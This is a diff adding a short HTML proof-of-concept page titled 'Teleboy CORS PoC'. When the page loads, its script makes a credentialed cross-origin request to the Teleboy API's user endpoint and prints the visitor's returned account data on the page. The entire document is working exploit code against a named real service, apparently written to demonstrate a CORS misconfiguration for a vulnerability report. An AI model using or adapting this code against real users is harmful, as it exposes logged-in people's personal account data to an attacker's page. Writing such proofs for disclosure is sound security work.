@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Teleboy CORS PoC</h2>
+<pre id="output">Fetching...</pre>
+<script>
+fetch("https://api.teleboy.ch/user", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+  document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+})
+.catch(e => {
+  document.getElementById("output").textContent = "Error: " + e;
+});
+</script>
+</body>
+</html>
